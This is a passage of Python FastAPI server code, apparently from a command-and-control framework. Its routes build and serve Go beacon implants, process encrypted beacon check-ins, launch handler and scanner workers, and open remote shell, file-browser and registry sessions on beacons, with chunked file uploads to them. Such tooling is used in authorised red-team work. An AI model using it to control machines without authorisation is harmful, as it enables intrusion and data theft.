    @api_router.get("/traffic-profiles", response_model=TrafficProfileListResponse, tags=["traffic-profiles"])
    def list_traffic_profiles(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        include_archived: bool = False,
    ) -> TrafficProfileListResponse:
        authorize_c2_token(settings, authorization)
        ensure_template_profiles(session)
        session.commit()
        query = select(TrafficProfile).order_by(TrafficProfile.is_template.desc(), TrafficProfile.name.asc())
        if not include_archived:
            query = query.where(TrafficProfile.is_archived.is_(False))
        profiles = session.execute(query).scalars()
        return TrafficProfileListResponse(
            items=[TrafficProfileResponse(**public_traffic_profile(session, profile)) for profile in profiles]
        )

    @api_router.post("/traffic-profiles", response_model=TrafficProfileResponse, tags=["traffic-profiles"])
    def create_traffic_profile(
        payload: TrafficProfileCreateRequest,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TrafficProfileResponse:
        claims = authorize_c2_token(settings, authorization)
        try:
            profile = create_profile(
                session,
                actor_subject=actor_subject_from_claims(claims),
                config=payload.config,
                description=payload.description,
                name=payload.name,
                template=payload.template,
            )
            session.commit()
            session.refresh(profile)
        except ValueError as exc:
            session.rollback()
            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
        return TrafficProfileResponse(**public_traffic_profile(session, profile))

    @api_router.get("/traffic-profiles/{profile_id}", response_model=TrafficProfileResponse, tags=["traffic-profiles"])
    def get_traffic_profile(
        profile_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TrafficProfileResponse:
        authorize_c2_token(settings, authorization)
        profile = session.get(TrafficProfile, profile_id)
        if profile is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
        return TrafficProfileResponse(**public_traffic_profile(session, profile))

    @api_router.patch(
        "/traffic-profiles/{profile_id}",
        response_model=TrafficProfileResponse,
        tags=["traffic-profiles"],
    )
    def update_traffic_profile(
        profile_id: uuid.UUID,
        payload: TrafficProfileUpdateRequest,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TrafficProfileResponse:
        claims = authorize_c2_token(settings, authorization)
        profile = session.get(TrafficProfile, profile_id)
        if profile is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
        try:
            updated = update_profile(
                session,
                profile,
                actor_subject=actor_subject_from_claims(claims),
                config=payload.config,
                description=payload.description,
                name=payload.name,
            )
            session.commit()
            session.refresh(updated)
        except ValueError as exc:
            session.rollback()
            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
        return TrafficProfileResponse(**public_traffic_profile(session, updated))

    @api_router.delete(
        "/traffic-profiles/{profile_id}",
        response_model=TrafficProfileResponse,
        tags=["traffic-profiles"],
    )
    def archive_traffic_profile(
        profile_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TrafficProfileResponse:
        authorize_c2_token(settings, authorization)
        profile = session.get(TrafficProfile, profile_id)
        if profile is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
        if profile.is_template:
            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Template profiles cannot be archived")
        assigned = session.execute(select(Beacon).where(Beacon.profile_id == profile.id)).first()
        if assigned is not None:
            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="Traffic profile is assigned to a beacon")
        profile.is_archived = True
        session.add(profile)
        session.commit()
        session.refresh(profile)
        return TrafficProfileResponse(**public_traffic_profile(session, profile))

    @api_router.post(
        "/traffic-profiles/{profile_id}/clone",
        response_model=TrafficProfileResponse,
        tags=["traffic-profiles"],
    )
    def clone_traffic_profile(
        profile_id: uuid.UUID,
        payload: TrafficProfileCloneRequest,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TrafficProfileResponse:
        claims = authorize_c2_token(settings, authorization)
        source = session.get(TrafficProfile, profile_id)
        if source is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
        try:
            cloned = clone_profile(
                session,
                source,
                actor_subject=actor_subject_from_claims(claims),
                name=payload.name,
            )
            session.commit()
            session.refresh(cloned)
        except ValueError as exc:
            session.rollback()
            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
        return TrafficProfileResponse(**public_traffic_profile(session, cloned))

    @api_router.get(
        "/traffic-profiles/{profile_id}/versions",
        response_model=TrafficProfileVersionListResponse,
        tags=["traffic-profiles"],
    )
    def list_traffic_profile_versions(
        profile_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TrafficProfileVersionListResponse:
        authorize_c2_token(settings, authorization)
        profile = session.get(TrafficProfile, profile_id)
        if profile is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
        versions = session.execute(
            select(TrafficProfileVersion)
            .where(TrafficProfileVersion.profile_id == profile.id)
            .order_by(TrafficProfileVersion.version.desc())
        ).scalars()
        return TrafficProfileVersionListResponse(
            items=[TrafficProfileVersionResponse(**public_traffic_profile_version(version)) for version in versions]
        )

    @api_router.post(
        "/traffic-profiles/{profile_id}/rollback",
        response_model=TrafficProfileResponse,
        tags=["traffic-profiles"],
    )
    def rollback_traffic_profile(
        profile_id: uuid.UUID,
        payload: TrafficProfileRollbackRequest,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TrafficProfileResponse:
        claims = authorize_c2_token(settings, authorization)
        profile = session.get(TrafficProfile, profile_id)
        if profile is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
        try:
            rolled_back = rollback_profile(
                session,
                profile,
                actor_subject=actor_subject_from_claims(claims),
                version=payload.version,
            )
            session.commit()
            session.refresh(rolled_back)
        except ValueError as exc:
            session.rollback()
            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
        return TrafficProfileResponse(**public_traffic_profile(session, rolled_back))

    @api_router.get(
        "/beacon-builds/targets",
        response_model=BeaconBuildTargetListResponse,
        tags=["beacon-builds"],
    )
    def list_beacon_build_targets(
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconBuildTargetListResponse:
        authorize_c2_token(settings, authorization)
        return BeaconBuildTargetListResponse(
            items=[BeaconBuildTargetResponse(**target) for target in SUPPORTED_TARGETS]
        )

    @api_router.get("/beacon-builds", response_model=BeaconBuildListResponse, tags=["beacon-builds"])
    def list_beacon_builds(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        limit: Annotated[int, Query(ge=1, le=100)] = 25,
    ) -> BeaconBuildListResponse:
        authorize_c2_token(settings, authorization)
        return BeaconBuildListResponse(
            items=[
                BeaconBuildResponse(**public_beacon_build(build, settings))
                for build in recent_builds(session, limit)
            ]
        )

    @api_router.post("/beacon-builds", response_model=BeaconBuildResponse, tags=["beacon-builds"])
    async def create_go_beacon_build(
        payload: BeaconBuildCreateRequest,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconBuildResponse:
        authorize_c2_token(settings, authorization)
        if not settings.beacon_builds_enabled:
            raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail="Beacon builds are disabled")

        private_key = c2_protocol_private_key(settings)
        build = create_beacon_build(
            session,
            payload,
            c2_public_key_b64=private_key_public_b64(private_key),
        )
        session.commit()
        session.refresh(build)

        if settings.app_env.lower() == "test":
            run_fake_build(session, settings, build, output_name=payload.output_name)
            session.commit()
            session.refresh(build)
        else:
            build_id = build.id
            output_name = payload.output_name
            asyncio.create_task(asyncio.to_thread(run_build_job, settings, build_id, output_name=output_name))

        return BeaconBuildResponse(**public_beacon_build(build, settings))

    @api_router.get("/beacon-builds/{build_id}", response_model=BeaconBuildResponse, tags=["beacon-builds"])
    def get_beacon_build(
        build_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> BeaconBuildResponse:
        authorize_c2_token(settings, authorization)
        build = session.get(BeaconBuild, build_id)
        if build is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon build not found")
        return BeaconBuildResponse(**public_beacon_build(build, settings))

    @api_router.get("/beacon-builds/{build_id}/artifact", response_model=None, tags=["beacon-builds"])
    def download_beacon_build_artifact(
        build_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> Response:
        authorize_c2_token(settings, authorization)
        build = session.get(BeaconBuild, build_id)
        if build is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon build not found")
        if build.status != "succeeded":
            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="Beacon build artifact is not ready")
        if build.artifact_id is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon build artifact not found")
        artifact = session.get(Artifact, build.artifact_id)
        if artifact is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon build artifact not found")
        try:
            content = read_artifact(settings, artifact)
        except ArtifactNotFound as exc:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Beacon build artifact not found",
            ) from exc
        except ArtifactStorageError as exc:
            raise HTTPException(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                detail="Artifact storage is unavailable",
            ) from exc
        filename = artifact_download_filename(build) or artifact.filename
        return Response(
            content=content,
            media_type=artifact.content_type,
            headers={
                "Content-Disposition": f'attachment; filename="{filename}"',
                "Content-Length": str(len(content)),
                "X-Content-Type-Options": "nosniff",
            },
        )

    @api_router.post("/protocol/frames", response_model=None, tags=["protocol"])
    async def submit_protocol_frame(
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> Response | JSONResponse:
        authorize_c2_token(settings, authorization)
        if not settings.protocol_frame_harness_enabled:
            raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Protocol frame harness is disabled")

        raw_frame = await request.body()
        metadata = frame_metadata(raw_frame)
        try:
            ensure_nonce_not_replayed(session, metadata)
            decoded = decode_frame(
                raw_frame,
                private_key=c2_protocol_private_key(settings),
                supported_versions=protocol_supported_versions(settings),
                max_frame_bytes=settings.protocol_max_frame_bytes,
            )
            beacon_id, ack_payload = process_protocol_frame(
                session,
                settings,
                decoded,
                transport_mode="rest",
                transport_connected=False,
            )
            dispatched_task_payload = None
            if decoded.message_type == TASK_POLL:
                dispatched_task_payload = await attach_dispatched_task_to_ack(
                    request.app,
                    session,
                    settings,
                    beacon_id=beacon_id,
                    ack_payload=ack_payload,
                )
            session_data_outcome = None
            if decoded.message_type == SESSION_DATA and beacon_id is not None:
                session_data_outcome = apply_beacon_session_data(
                    session,
                    beacon_id=beacon_id,
                    payload=decoded.payload,
                    settings=settings,
                )
            record_frame_receipt(session, decoded, beacon_id=beacon_id)
            session.commit()
            if beacon_id is not None and decoded.message_type == REGISTER:
                beacon = session.get(Beacon, beacon_id)
                if beacon is not None:
                    await publish_beacon_event(
                        request.app,
                        settings,
                        str(ack_payload.get("event_type", "beacon.registered")),
                        public_beacon(beacon),
                    )
            if dispatched_task_payload is not None:
                await publish_task_event(
                    request.app,
                    settings,
                    task_event_type(dispatched_task_payload["status"]),
                    dispatched_task_payload,
                )
            if ack_payload.get("task_event_type") and isinstance(ack_payload.get("task"), dict):
                await publish_task_event(
                    request.app,
                    settings,
                    str(ack_payload["task_event_type"]),
                    ack_payload["task"],
                )
            if ack_payload.get("task_result_chunk_event_type") and isinstance(
                ack_payload.get("task_result_chunk"), dict
            ):
                await publish_task_result_chunk_event(
                    request.app,
                    settings,
                    str(ack_payload["task_result_chunk_event_type"]),
                    ack_payload["task_result_chunk"],
                )
            if ack_payload.get("task_result_event_type") and isinstance(ack_payload.get("task_result"), dict):
                await publish_task_result_event(
                    request.app,
                    settings,
                    str(ack_payload["task_result_event_type"]),
                    ack_payload["task_result"],
                )
            if session_data_outcome is not None:
                if session_data_outcome.cache_listing is not None:
                    await request.app.state.session_file_cache.store(
                        session_data_outcome.session_id,
                        session_data_outcome.cache_listing,
                    )
                if session_data_outcome.operator_message is not None:
                    await request.app.state.session_relay_manager.deliver(
                        session_data_outcome.session_id,
                        session_data_outcome.operator_message,
                    )
                if session_data_outcome.event_type is not None:
                    await publish_session_payload_event(
                        request.app,
                        settings,
                        session_data_outcome.event_type,
                        session_data_outcome.session_payload,
                    )
            return encrypted_protocol_response(settings, decoded, ACK, ack_payload)
        except ProtocolError as exc:
            session.rollback()
            record_protocol_error(session, exc, metadata)
            session.commit()
            return protocol_error_response(exc)
        except TaskQueueUnavailable:
            session.rollback()
            raise task_queue_unavailable_exception() from None

    @api_router.get(
        "/infrastructure/workers",
        response_model=InfrastructureWorkerListResponse,
        tags=["infrastructure"],
    )
    def list_infrastructure_workers(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> InfrastructureWorkerListResponse:
        authorize_c2_token(settings, authorization)
        ensure_embedded_workers(session, settings)
        session.commit()
        workers = session.execute(
            select(InfrastructureWorker).order_by(
                InfrastructureWorker.kind.asc(),
                InfrastructureWorker.origin.asc(),
                InfrastructureWorker.name.asc(),
            )
        ).scalars()
        return InfrastructureWorkerListResponse(
            items=[InfrastructureWorkerResponse(**public_worker(worker)) for worker in workers]
        )

    @api_router.post(
        "/infrastructure/pairing-tokens",
        response_model=PairingTokenCreateResponse,
        tags=["infrastructure"],
    )
    def create_worker_pairing_token(
        payload: PairingTokenCreateRequest,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> PairingTokenCreateResponse:
        authorize_c2_token(settings, authorization)
        pairing_token, plaintext = issue_pairing_token(session, settings, kind=payload.kind, name=payload.name)
        record_worker_event(
            session,
            None,
            kind=payload.kind,
            event_type="worker.pairing_token.created",
            message=f"Pairing token created for {payload.name}.",
        )
        session.commit()
        session.refresh(pairing_token)
        return PairingTokenCreateResponse(
            id=str(pairing_token.id),
            kind=pairing_token.kind,
            name=pairing_token.name,
            pairing_token=plaintext,
            expires_at=pairing_token.expires_at,
            command=pairing_command(settings, kind=pairing_token.kind, token=plaintext, name=pairing_token.name),
        )

    @api_router.post(
        "/infrastructure/workers/register",
        response_model=WorkerRegistrationResponse,
        tags=["infrastructure"],
    )
    async def register_infrastructure_worker(
        payload: WorkerRegistrationRequest,
        request: Request,
        session: DbSession,
    ) -> WorkerRegistrationResponse:
        pairing_token = find_valid_pairing_token(session, payload.pairing_token)
        if pairing_token is None or pairing_token.kind != payload.kind:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid or expired worker pairing token",
                headers={"WWW-Authenticate": "Bearer"},
            )

        now = utc_now()
        worker = session.get(InfrastructureWorker, pairing_token.worker_id) if pairing_token.worker_id else None
        if worker is None:
            worker = InfrastructureWorker(kind=payload.kind, name=payload.name, origin="external")
        worker.name = payload.name
        worker.kind = payload.kind
        worker.status = WORKER_STATUS_ONLINE
        worker.endpoint = payload.endpoint
        worker.capabilities = payload.capabilities
        worker.capacity = payload.capacity
        worker.current_load = payload.current_load
        worker.version = payload.version
        worker.last_seen = now
        worker.last_error = None
        worker_token = generate_opaque_token()
        worker.worker_token_hash = hash_opaque_token(worker_token)
        session.add(worker)
        session.flush()
        pairing_token.worker_id = worker.id
        pairing_token.used_at = now
        session.add(pairing_token)
        record_worker_event(
            session,
            worker,
            kind=worker.kind,
            event_type="worker.registered",
            message=f"{worker.name} registered with C2.",
            occurred_at=now,
        )
        session.commit()
        session.refresh(worker)

        worker_payload = public_worker(worker)
        await publish_worker_event(request.app, settings, "worker.registered", worker_payload)
        return WorkerRegistrationResponse(
            worker_id=str(worker.id),
            worker_token=worker_token,
            heartbeat_interval_seconds=settings.worker_heartbeat_interval_seconds,
            worker=InfrastructureWorkerResponse(**worker_payload),
        )

    @api_router.post(
        "/infrastructure/workers/{worker_id}/heartbeat",
        response_model=WorkerHeartbeatResponse,
        tags=["infrastructure"],
    )
    async def heartbeat_infrastructure_worker(
        worker_id: uuid.UUID,
        payload: WorkerHeartbeatRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> WorkerHeartbeatResponse:
        worker = find_authenticated_worker(session, worker_id, worker_bearer_token(authorization))
        if worker is None:
            raise worker_auth_exception()

        old_status = worker.status
        worker.status = WORKER_STATUS_ONLINE
        worker.endpoint = payload.endpoint
        worker.capabilities = payload.capabilities
        worker.capacity = payload.capacity
        worker.current_load = payload.current_load
        worker.version = payload.version
        worker.last_seen = utc_now()
        worker.last_error = None
        session.add(worker)
        if old_status != WORKER_STATUS_ONLINE:
            record_worker_event(
                session,
                worker,
                kind=worker.kind,
                event_type="worker.status.changed",
                message=f"{worker.name} changed from {old_status} to online.",
            )
        session.commit()
        session.refresh(worker)

        worker_payload = public_worker(worker)
        await publish_worker_event(request.app, settings, "worker.heartbeat", worker_payload)
        if old_status != WORKER_STATUS_ONLINE:
            await publish_worker_event(request.app, settings, "worker.status.changed", worker_payload)
        return WorkerHeartbeatResponse(
            status=worker.status,
            heartbeat_interval_seconds=settings.worker_heartbeat_interval_seconds,
            worker=InfrastructureWorkerResponse(**worker_payload),
        )

    @api_router.post(
        "/infrastructure/workers/launch",
        response_model=WorkerLaunchResponse,
        tags=["infrastructure"],
    )
    async def launch_infrastructure_worker(
        payload: WorkerLaunchRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> WorkerLaunchResponse:
        authorize_c2_token(settings, authorization)
        port_owner = session.execute(
            select(InfrastructureWorker).where(
                InfrastructureWorker.managed_host_port == payload.host_port,
                InfrastructureWorker.status.notin_([WORKER_STATUS_FAILED, WORKER_STATUS_OFFLINE]),
            )
        ).scalar_one_or_none()
        if port_owner is not None:
            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="Host port is already assigned")

        worker = InfrastructureWorker(
            kind=payload.kind,
            name=payload.name,
            origin=WORKER_ORIGIN_C2_MANAGED,
            status=WORKER_STATUS_STARTING,
            capacity=1,
            current_load=0,
            managed_service="beacon-handler" if payload.kind == "beacon-handler" else "scanner",
            managed_compose_file=(
                "docker-compose.handler.yml" if payload.kind == "beacon-handler" else "docker-compose.scanner.yml"
            ),
            managed_host_port=payload.host_port,
        )
        session.add(worker)
        session.flush()
        pairing_token, plaintext = issue_pairing_token(
            session,
            settings,
            kind=payload.kind,
            name=payload.name,
            worker=worker,
        )
        record_worker_event(
            session,
            worker,
            kind=worker.kind,
            event_type="worker.launch.requested",
            message=f"Launch requested for {worker.name}.",
        )
        session.commit()
        session.refresh(worker)

        try:
            project_name, endpoint = launch_worker(
                settings,
                kind=worker.kind,
                name=worker.name,
                worker_id=worker.id,
                pairing_token=plaintext,
                host_port=payload.host_port,
            )
            worker.managed_project = project_name
            worker.endpoint = endpoint
            worker.status = WORKER_STATUS_STARTING
            worker.last_error = None
            record_worker_event(
                session,
                worker,
                kind=worker.kind,
                event_type="worker.launch.started",
                message=f"Docker Compose project {project_name} started for {worker.name}.",
            )
            session.add(worker)
            session.commit()
        except ProvisioningError as exc:
            worker.status = WORKER_STATUS_FAILED
            worker.last_error = str(exc)
            record_worker_event(
                session,
                worker,
                kind=worker.kind,
                event_type="worker.launch.failed",
                message=str(exc),
            )
            session.add(worker)
            session.commit()
            await publish_worker_event(request.app, settings, "worker.status.changed", public_worker(worker))
            raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail=str(exc)) from exc

        session.refresh(worker)
        worker_payload = public_worker(worker)
        await publish_worker_event(request.app, settings, "worker.launch.started", worker_payload)
        return WorkerLaunchResponse(worker=InfrastructureWorkerResponse(**worker_payload))

    @api_router.post(
        "/infrastructure/workers/{worker_id}/stop",
        response_model=WorkerStopResponse,
        tags=["infrastructure"],
    )
    async def stop_infrastructure_worker(
        worker_id: uuid.UUID,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> WorkerStopResponse:
        authorize_c2_token(settings, authorization)
        worker = session.get(InfrastructureWorker, worker_id)
        if worker is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Worker not found")
        if worker.origin == WORKER_ORIGIN_EMBEDDED:
            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Embedded workers cannot be stopped")
        if worker.origin != WORKER_ORIGIN_C2_MANAGED or not worker.managed_project:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Only C2-managed workers can be stopped",
            )

        worker.status = WORKER_STATUS_STOPPING
        session.add(worker)
        session.commit()
        try:
            stop_worker(settings, kind=worker.kind, project_name=worker.managed_project)
            worker.status = WORKER_STATUS_OFFLINE
            worker.last_error = None
            record_worker_event(
                session,
                worker,
                kind=worker.kind,
                event_type="worker.stopped",
                message=f"{worker.name} was stopped by operator request.",
            )
            session.add(worker)
            session.commit()
        except ProvisioningError as exc:
            worker.status = WORKER_STATUS_FAILED
            worker.last_error = str(exc)
            record_worker_event(
                session,
                worker,
                kind=worker.kind,
                event_type="worker.stop.failed",
                message=str(exc),
            )
            session.add(worker)
            session.commit()
            await publish_worker_event(request.app, settings, "worker.status.changed", public_worker(worker))
            raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail=str(exc)) from exc

        session.refresh(worker)
        worker_payload = public_worker(worker)
        await publish_worker_event(request.app, settings, "worker.status.changed", worker_payload)
        return WorkerStopResponse(status=worker.status, worker=InfrastructureWorkerResponse(**worker_payload))

    @api_router.post("/sessions/shell", response_model=ShellSessionResponse, tags=["sessions"])
    async def open_shell_session(
        payload: ShellSessionCreateRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> ShellSessionResponse:
        claims = authorize_c2_token(settings, authorization)
        actor_subject = actor_subject_from_claims(claims)
        try:
            beacon_id = uuid.UUID(payload.beacon_id)
        except ValueError as exc:
            raise HTTPException(
                status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
                detail="beacon_id must be a UUID",
            ) from exc
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        ensure_beacon_active(beacon)
        shell_session = create_shell_session(
            session,
            beacon=beacon,
            actor_subject=actor_subject,
            shell_type=payload.shell_type,
            rows=payload.rows,
            cols=payload.cols,
        )
        open_payload = session_frame_payload(
            shell_session,
            SESSION_OP_OPEN,
            shell_type=shell_session.shell_type,
            rows=shell_session.rows,
            cols=shell_session.cols,
        )
        try:
            await enqueue_session_data_frame(request.app, settings, session, shell_session, open_payload)
        except HTTPException:
            session.rollback()
            raise
        session.commit()
        session.refresh(shell_session)
        await publish_session_event(request.app, settings, "session.opening", shell_session)
        return ShellSessionResponse(**public_shell_session(shell_session))

    @api_router.post("/sessions/file-browser", response_model=FileBrowserSessionResponse, tags=["sessions"])
    async def open_file_browser_session(
        payload: FileBrowserSessionCreateRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> FileBrowserSessionResponse:
        claims = authorize_c2_token(settings, authorization)
        actor_subject = actor_subject_from_claims(claims)
        try:
            beacon_id = uuid.UUID(payload.beacon_id)
        except ValueError as exc:
            raise HTTPException(
                status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
                detail="beacon_id must be a UUID",
            ) from exc
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        ensure_beacon_active(beacon)
        file_session = create_file_browser_session(session, beacon=beacon, actor_subject=actor_subject)
        open_payload = session_frame_payload(
            file_session,
            SESSION_OP_OPEN,
            root_path=payload.root_path,
            session_type=FILE_BROWSER_SESSION_TYPE,
        )
        try:
            await enqueue_session_data_frame(request.app, settings, session, file_session, open_payload)
        except HTTPException:
            session.rollback()
            raise
        session.commit()
        session.refresh(file_session)
        await publish_session_event(request.app, settings, "session.opening", file_session)
        return FileBrowserSessionResponse(**public_session(file_session))

    @api_router.post("/sessions/registry", response_model=RegistrySessionResponse, tags=["sessions"])
    async def open_registry_session(
        payload: RegistrySessionCreateRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> RegistrySessionResponse:
        claims = authorize_c2_token(settings, authorization)
        actor_subject = actor_subject_from_claims(claims)
        try:
            beacon_id = uuid.UUID(payload.beacon_id)
        except ValueError as exc:
            raise HTTPException(
                status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
                detail="beacon_id must be a UUID",
            ) from exc
        beacon = session.get(Beacon, beacon_id)
        if beacon is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
        ensure_beacon_active(beacon)
        if "windows" not in beacon.os.lower():
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Registry sessions require a Windows beacon",
            )
        registry_session = create_registry_session(session, beacon=beacon, actor_subject=actor_subject)
        open_payload = session_frame_payload(
            registry_session,
            SESSION_OP_OPEN,
            session_type=REGISTRY_SESSION_TYPE,
        )
        try:
            await enqueue_session_data_frame(request.app, settings, session, registry_session, open_payload)
        except HTTPException:
            session.rollback()
            raise
        session.commit()
        session.refresh(registry_session)
        await publish_session_event(request.app, settings, "session.opening", registry_session)
        return RegistrySessionResponse(**public_session(registry_session))

    @api_router.get("/sessions/{session_id}", response_model=SessionResponse, tags=["sessions"])
    def get_session(
        session_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> SessionResponse:
        authorize_c2_token(settings, authorization)
        shell_session = session.get(InteractiveSession, session_id)
        if shell_session is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Session not found")
        return SessionResponse(**public_session(shell_session))

    @api_router.delete("/sessions/{session_id}", response_model=SessionResponse, tags=["sessions"])
    async def close_session_route(
        session_id: uuid.UUID,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> SessionResponse:
        authorize_c2_token(settings, authorization)
        shell_session = session.get(InteractiveSession, session_id)
        if shell_session is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Session not found")
        session_payload = await close_interactive_session_for_operator(
            request.app,
            settings,
            session,
            shell_session,
            reason="operator",
        )
        if session_payload is not None:
            session.commit()
            session.refresh(shell_session)
            await publish_closed_session_payload(request.app, settings, session_payload)
        return SessionResponse(**public_session(shell_session))

    @api_router.post("/file-transfers/uploads", response_model=FileTransferResponse, tags=["file-transfers"])
    def create_file_transfer_upload(
        payload: FileTransferCreateRequest,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> FileTransferResponse:
        claims = authorize_c2_token(settings, authorization)
        actor_subject = actor_subject_from_claims(claims)
        try:
            beacon_id = uuid.UUID(payload.beacon_id)
            session_id = uuid.UUID(payload.session_id)
        except ValueError as exc:
            raise HTTPException(
                status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
                detail="beacon_id and session_id must be UUIDs",
            ) from exc
        beacon = session.get(Beacon, beacon_id)
        file_session = session.get(InteractiveSession, session_id)
        if beacon is None or file_session is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="File transfer session not found")
        if (
            file_session.actor_subject != actor_subject
            or file_session.beacon_id != beacon.id
            or file_session.session_type != FILE_BROWSER_SESSION_TYPE
        ):
            raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="File transfer session is not available")
        try:
            transfer = create_upload_transfer(
                session,
                actor_subject=actor_subject,
                beacon_id=beacon.id,
                session_id=file_session.id,
                filename=payload.filename,
                remote_path=payload.remote_path,
                size_bytes=payload.size_bytes,
                sha256=payload.sha256,
                chunk_size_bytes=settings.file_transfer_chunk_size_bytes,
                max_size_bytes=settings.file_transfer_max_size_bytes,
                overwrite=payload.overwrite,
            )
        except FileTransferError as exc:
            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(exc)) from exc
        session.commit()
        session.refresh(transfer)
        return FileTransferResponse(**public_file_transfer(transfer))

    @api_router.get("/file-transfers/{transfer_id}", response_model=FileTransferResponse, tags=["file-transfers"])
    def get_file_transfer(
        transfer_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> FileTransferResponse:
        claims = authorize_c2_token(settings, authorization)
        actor_subject = actor_subject_from_claims(claims)
        transfer = session.get(FileTransfer, transfer_id)
        if transfer is None or transfer.actor_subject != actor_subject:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="File transfer not found")
        return FileTransferResponse(**public_file_transfer(transfer))

    @api_router.put(
        "/file-transfers/{transfer_id}/chunks/{sequence}",
        response_model=FileTransferResponse,
        tags=["file-transfers"],
    )
    def upload_file_transfer_chunk(
        transfer_id: uuid.UUID,
        sequence: int,
        payload: FileTransferChunkUploadRequest,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> FileTransferResponse:
        claims = authorize_c2_token(settings, authorization)
        actor_subject = actor_subject_from_claims(claims)
        if sequence < 0:
            raise HTTPException(
                status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
                detail="sequence must be non-negative",
            )
        try:
            stage_upload_chunk(
                session,
                settings,
                transfer_id,
                actor_subject=actor_subject,
                sequence=sequence,
                data_b64=payload.data_b64,
                chunk_sha256=payload.chunk_sha256,
            )
            transfer = session.get(FileTransfer, transfer_id)
            if transfer is None:
                raise FileTransferError("File transfer not found")
        except FileTransferError as exc:
            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(exc)) from exc
        session.commit()
        session.refresh(transfer)
